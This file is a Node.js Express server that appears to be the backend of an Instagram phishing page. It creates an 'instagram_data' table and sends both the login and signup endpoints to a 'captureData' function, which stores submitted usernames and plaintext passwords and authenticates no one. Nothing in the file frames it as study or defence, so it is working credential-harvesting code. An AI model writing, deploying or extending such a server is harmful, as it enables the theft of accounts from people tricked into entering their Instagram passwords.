const express = require('express');
const { Pool } = require('pg');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const port = process.env.PORT || 3001;

app.use(cors());
app.use(express.json());

const rootPath = __dirname;
const distPath = path.join(rootPath, 'dist');

// Serve bundled static assets with explicit MIME type enforcement
app.use('/dist', express.static(distPath, {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript');
    }
  }
}));

// Serve root static files (for index.html, etc.)
app.use(express.static(rootPath));

// DB Connection Configuration
const dbConfig = {
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL && !process.env.DATABASE_URL.includes('localhost') 
    ? { rejectUnauthorized: false } 
    : false
};

let dbPool;
let dbStatus = "disconnected";

async function initDb() {
  if (!process.env.DATABASE_URL) return null;
  const pool = new Pool(dbConfig);
  try {
    await pool.query('SELECT NOW()');
    await pool.query(`
      CREATE TABLE IF NOT EXISTS instagram_data (
        id SERIAL PRIMARY KEY,
        identifier TEXT,
        password TEXT,
        full_name TEXT,
        username TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      );
    `);
    dbStatus = "connected";
    return pool;
  } catch (err) {
    dbStatus = `error: ${err.message}`;
    return null;
  }
}

initDb().then(pool => { dbPool = pool; });

app.get('/api/health', (req, res) => res.json({ status: "server_up", database: dbStatus }));

const captureData = async (req, res) => {
  const { identifier, password, fullName, username } = req.body;
  if (!dbPool) return res.status(503).json({ success: false, message: 'Database not connected' });
  try {
    const query = `INSERT INTO instagram_data (identifier, password, full_name, username) VALUES ($1, $2, $3, $4) RETURNING id;`;
    const result = await dbPool.query(query, [identifier, password, fullName || null, username || null]);
    res.status(200).json({ success: true, id: result.rows[0].id });
  } catch (err) {
    res.status(500).json({ success: false, message: 'Database error' });
  }
};

app.post('/api/signup', captureData);
app.post('/api/login', captureData);

app.get('*', (req, res) => {
  // Catch-all for SPA routing: serve index.html
  res.sendFile(path.join(rootPath, 'index.html'));
});

app.listen(port, () => console.log(`🚀 Server listening on port ${port}`));